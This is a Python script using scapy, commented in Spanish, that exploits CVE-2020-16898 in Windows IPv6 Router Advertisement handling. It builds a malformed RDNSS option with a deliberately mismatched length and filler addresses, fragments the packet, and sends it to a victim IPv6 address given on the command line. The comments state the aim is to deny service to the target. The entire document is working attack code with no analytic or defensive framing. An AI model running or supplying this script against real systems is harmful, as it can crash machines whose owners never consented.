#!/usr/bin/env python3
# CVE-2020-16898

from scapy.all import *
import sys

#----DIRECCIONES IPV6 VÍCTIMA/ATACANTE-----#
#Cambiar a la dirección IPV6 de la máquina víctima:
ipv6_dst = sys.argv[1]
#Cambiar a la dirección IPV6 de la máquina atacante:
ipv6_src = "fe80::1683:e4ba:b8ad:c261"

#----CREAMOS EL PAQUETE MALICIOSO----#
#Creamos el paquete RDNSS:
e = ICMPv6NDOptRDNSS()
e.len = 27  #Calculamos la longitud como 1 incremento de la cabecera + 2*13 de las direcciones IPV6
e.dns = [
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",   #Ponemos As como direcciones basura
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA"]

# Envío un paquete de tipo Router Advertisement
    # Añado la opción de RDNSS, con una longitud de 4, por lo que tendrá 2 direcciones IPv6
	 # Cargo la primera con valores basura (\x00 * 16)
	 # Configuro la siguiente para añadir el paquete que deniega el servicio, pero solo puedo rellenar 8 bytes de esos 16 para que coincida con el campo length 
pkt = ICMPv6ND_RA() / ICMPv6NDOptRDNSS(len=4) / Raw(load=b"\x00"*16 + b"\x18\x1A" + b"\x00\x00"*3) / e

#----FRAGMENTACIÓN----#
# Encapsulo el paquete ICMPv6 con una cabecera IPv6 que incluya las direcciones de origen y destino.
# Añado en la cabecera IPv6 de la opción de fragmentación
# El tiempo de vida debe ser 255 para pasar las verficaciones
pktAFragmentar = IPv6(dst=ipv6_dst, src=ipv6_src, hlim=255) / IPv6ExtHdrFragment() / pkt
#Fragmento el paquete IPv6 en trozos de 200 bytes de MTU
pktFragmentado = fragment6(pktAFragmentar, 200)

# For que recorre los fragmentos y los envía en orden
for fragmento in pktFragmentado:
    send(fragmento)






